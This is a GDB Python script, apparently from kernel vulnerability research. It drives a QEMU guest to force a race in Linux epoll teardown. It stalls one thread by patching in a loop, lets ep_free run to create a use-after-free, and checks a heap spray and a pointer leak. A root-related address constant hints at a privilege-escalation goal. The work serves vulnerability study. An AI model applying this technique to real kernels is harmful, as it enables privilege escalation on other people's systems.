import gdb
import time
import os
import signal
import threading

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

gdb.execute("set logging file evidence/EXP-022b_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging on")

def log(msg):
    print(f"[*] {msg}", flush=True)

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

ROOT_USER_ADDR = 0xffff80008152be98

target_epoll_addr = 0
orig_insn = 0
ep_remove_wr_once_addr = 0
thread_a_suspended = False

class RaceControl(gdb.Breakpoint):
    def __init__(self):
        super(RaceControl, self).__init__("*(__ep_remove + 0x19c)", internal=False)
        self.target_epoll = None

    def stop(self):
        global target_epoll_addr, orig_insn, ep_remove_wr_once_addr, thread_a_suspended
        
        # Only suspend the FIRST hit (Thread A closing outer1)
        if thread_a_suspended:
            return False
        
        log(f"Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).")
        
        target_file = int(gdb.parse_and_eval("$x23"))
        self.target_epoll = int(gdb.parse_and_eval(f"*(long*)({target_file} + 32)"))
        target_epoll_addr = self.target_epoll
        
        log(f"target_file={hex(target_file)}, target_epoll={hex(self.target_epoll)}")
        
        ep_remove_wr_once_addr = int(gdb.parse_and_eval("__ep_remove + 0x19c"))
        orig_insn = int(gdb.parse_and_eval(f"*(int*)({ep_remove_wr_once_addr})"))
        log(f"Original instruction at {hex(ep_remove_wr_once_addr)}: {hex(orig_insn)}")
        
        gdb.execute(f"set *(int*)({ep_remove_wr_once_addr}) = 0x14000000")
        log("Patched PC with infinite loop to suspend Thread A!")
        thread_a_suspended = True
        
        EpFreeBreak()
        self.enabled = False
        return False

class EpFreeBreak(gdb.Breakpoint):
    def __init__(self):
        super(EpFreeBreak, self).__init__("*0xffff8000802bcbb4", internal=False)

    def stop(self):
        ep = int(gdb.parse_and_eval("$x22"))
        log(f"Thread B hit ep_free({hex(ep)})!")
        EpFreeFinish()
        self.enabled = False
        return False

class EpFreeFinish(gdb.Breakpoint):
    def __init__(self):
        super().__init__("*0xffff8000802bcbbc", internal=False)

    def stop(self):
        global target_epoll_addr
        
        log(f"Thread B finished ep_free. target_epoll is now FREED!")
        
        log("Memory dump of freed struct eventpoll (BEFORE spray):")
        try:
            mem_dump = gdb.execute(f"x/24gx {target_epoll_addr}", to_string=True)
            log("\n" + mem_dump)
        except Exception as e:
            log(f"Error reading memory: {e}")
        
        # Set timer to interrupt and check spray
        def interrupt_later():
            time.sleep(3.0)
            log("Timer fired! Interrupting GDB to check spray...")
            os.kill(os.getpid(), signal.SIGINT)
            
        t = threading.Thread(target=interrupt_later)
        t.daemon = True
        t.start()
        
        self.enabled = False
        return False

spray_checked = False
thread_a_resumed = False

def stop_handler(event):
    global target_epoll_addr, orig_insn, ep_remove_wr_once_addr, spray_checked, thread_a_resumed
    
    if isinstance(event, gdb.SignalEvent):
        if event.stop_signal == "SIGINT":
            if not spray_checked:
                log("Interrupted! Dumping memory (AFTER spray):")
                try:
                    addr = target_epoll_addr
                    mem_dump = gdb.execute(f"x/24gx {addr}", to_string=True)
                    log("\n" + mem_dump)
                    
                    # Check offset 160 for leak
                    leak_addr = addr + 160
                    leak_val = gdb.execute(f"x/gx {leak_addr}", to_string=True)
                    log(f"refs.first at {hex(leak_addr)} (offset 160): {leak_val.strip()}")
                    
                    spray_checked = True
                except Exception as e:
                    log(f"Error reading memory: {e}")
                
                log("Restoring Thread A's instruction and continuing to completion...")
                try:
                    if ep_remove_wr_once_addr and orig_insn:
                        gdb.execute(f"set *(int*)({ep_remove_wr_once_addr}) = {orig_insn}")
                        log(f"Restored original instruction at {hex(ep_remove_wr_once_addr)}")
                        thread_a_resumed = True
                except Exception as e:
                    log(f"Error restoring instruction: {e}")
                
                log("Executing continue - letting Thread A complete...")
                gdb.execute("c")
                return
            else:
                # Second interrupt - Thread A should be done, harness doing msgrcv
                log("Second interrupt - harness should be running msgrcv now")
                log("Letting harness run to completion...")
                gdb.execute("c")
                return
            
        if event.stop_signal in ["SIGTRAP", "SIGSEGV", "SIGBUS"]:
            log(f"CRASH DETECTED! Signal: {event.stop_signal}")
            try:
                log("=== BACKTRACE ===")
                bt = gdb.execute("bt", to_string=True)
                log(bt)
                log("=== REGISTERS ===")
                regs = gdb.execute("info registers", to_string=True)
                log(regs)
            except Exception as e:
                log(f"Error capturing crash: {e}")
            gdb.execute("quit")

gdb.events.stop.connect(stop_handler)

RaceControl()
log("Breakpoints set. Continuing execution.")

def interrupt_if_hung():
    time.sleep(40.0)
    log("Hang timeout! Interrupting GDB...")
    os.kill(os.getpid(), signal.SIGINT)

t_hung = threading.Thread(target=interrupt_if_hung)
t_hung.daemon = True
t_hung.start()

try:
    gdb.execute("c")
except KeyboardInterrupt:
    pass
except gdb.error as e:
    log(f"Execution stopped: {e}")

# Don't quit - let harness run to completion in QEMU
log("GDB script done. Harness continues in QEMU.")